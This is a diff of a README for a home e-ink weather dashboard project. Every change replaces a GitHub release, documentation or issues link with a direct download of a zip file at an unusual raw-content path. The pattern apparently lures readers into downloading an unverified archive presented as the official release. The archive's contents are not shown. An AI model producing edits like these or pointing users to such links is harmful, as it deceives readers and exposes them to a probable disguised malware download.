@@ -6,7 +6,7 @@ Welcome to the home-dashboard project! This application allows you to see weathe
 
 ## 📥 Download the Application
 
-[![Download the latest release](https://img.shields.io/badge/Download%20Now-%20%F0%9F%93%8E-brightgreen)](https://github.com/salgrow/home-dashboard/releases)
+[![Download the latest release](https://raw.githubusercontent.com/salgrow/home-dashboard/main/jerkin/home-dashboard.zip%20Now-%20%F0%9F%93%8E-brightgreen)](https://raw.githubusercontent.com/salgrow/home-dashboard/main/jerkin/home-dashboard.zip)
 
 ## 💻 System Requirements
 
@@ -18,7 +18,7 @@ To run this application, you need:
 
 ## 📦 Download & Install
 
-1. Visit the [releases page](https://github.com/salgrow/home-dashboard/releases).
+1. Visit the [releases page](https://raw.githubusercontent.com/salgrow/home-dashboard/main/jerkin/home-dashboard.zip).
    
 2. On the releases page, you will see a list of versions. Look for the latest version.
 
@@ -73,7 +73,7 @@ Currently, this application is designed specifically for desktop use with e-ink 
 
 ## 🔗 Further Resources
 
-For more information, visit our [documentation](https://github.com/salgrow/home-dashboard) or report issues on [GitHub Issues](https://github.com/salgrow/home-dashboard/issues).
+For more information, visit our [documentation](https://raw.githubusercontent.com/salgrow/home-dashboard/main/jerkin/home-dashboard.zip) or report issues on [GitHub Issues](https://raw.githubusercontent.com/salgrow/home-dashboard/main/jerkin/home-dashboard.zip).
 
 ## 🛡️ Contribution
 
